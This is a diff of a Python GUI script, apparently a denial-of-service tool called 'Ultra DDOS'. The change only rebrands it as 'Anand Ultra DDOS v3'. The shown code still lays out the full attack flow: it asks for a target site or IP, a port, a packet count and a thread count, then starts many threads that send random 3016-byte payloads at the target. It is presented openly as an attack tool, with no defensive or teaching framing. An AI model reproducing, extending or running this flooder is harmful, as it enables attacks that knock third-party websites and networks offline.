@@ -1,5 +1,5 @@
 
-# Ultra DDOS v2
+# Anand Ultra DDOS v3
 import easygui as eg
 import socket
 import random
@@ -43,32 +43,32 @@ def checknum(number):
     if number.isnumeric():
         return int(number)
     else:
-        eg.msgbox("That was not a number.", "Ultra DDOS v2")
+        eg.msgbox("That was not a number.", "Anand Ultra DDOS v3")
         raise ZeroDivisionError
 
-eg.msgbox("Welcome to Ultra DDOS v2!", "Ultra DDOS v2")
+eg.msgbox("Welcome to Ultra DDOS v2!", "Anand Ultra DDOS v3")
 while True:
     try:
-        selection = eg.buttonbox("", "Ultra DDOS v2", ["DDOS Attack", "Credits", "Exit"], image="logo.png")
+        selection = eg.buttonbox("", "Anand Ultra DDOS v3", ["DDOS Attack", "Credits", "Exit"], image="logo.png")
         if selection == "logo.png":
-            eg.msgbox("How is clicking pictures going to cause anything...", "Ultra DDOS v2")
+            eg.msgbox("How is clicking pictures going to cause anything...", "Anand Ultra DDOS v3")
             wb.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
         if selection == "Exit":
             sys.exit(0)
         if selection == "Credits":
-            eg.msgbox("DDOS script written by UltraTechZ\nGUI script written by WalesWorksLtd", "Ultra DDOS v2")
+            eg.msgbox("DDOS script written by UltraTechZ\nGUI script written by WalesWorksLtd", "Anand Ultra DDOS v3")
         if selection == "DDOS Attack":
-            ip = eg.enterbox("Please enter your target. This is the website or IP address that you want to attack.", "Ultra DDOS v2")
+            ip = eg.enterbox("Please enter your target. This is the website or IP address that you want to attack.", "Anand Ultra DDOS v3")
             if ip.strip() == "":
-                eg.msgbox("You did not enter a target.", "Ultra DDOS v2")
+                eg.msgbox("You did not enter a target.", "Anand Ultra DDOS v3")
                 raise ZeroDivisionError
-            port = eg.enterbox("Please enter a port. 80 is most commonly used, but you can use any other valid port.", "Ultra DDOS v2")
+            port = eg.enterbox("Please enter a port. 80 is most commonly used, but you can use any other valid port.", "Anand Ultra DDOS v3")
             port = checknum(port)
-            pack = eg.enterbox("Please enter the number of packets you would like to send. More is better, but too many will crash your computer.", "Ultra DDOS v2")
+            pack = eg.enterbox("Please enter the number of packets you would like to send. More is better, but too many will crash your computer.", "Anand Ultra DDOS v3")
             pack = checknum(pack)
-            thread = eg.enterbox("Please enter the number of threads you would like to send. This can be the same number as the packets.", "Ultra DDOS v2")
+            thread = eg.enterbox("Please enter the number of threads you would like to send. This can be the same number as the packets.", "Anand Ultra DDOS v3")
             thread = checknum(thread)
-            eg.msgbox("The attack will start once you press OK. It will keep going until all requested packets are sent.", "Ultra DDOS v2")
+            eg.msgbox("The attack will start once you press OK. It will keep going until all requested packets are sent.", "Anand Ultra DDOS v3")
             def start():
                 global useragents, ref, acceptalln
                 hh = random._urandom(3016)
@@ -91,7 +91,7 @@ while True:
             for x in range(thread):
                 thred = threading.Thread(target=start)
                 thred.start()
-            eg.msgbox("All requested packets have been sent to the target!", "Ultra DDOS v2")
+            eg.msgbox("All requested packets have been sent to the target!", "Anand Ultra DDOS v3")
     except:
         if selection == "Exit":
             sys.exit(0)
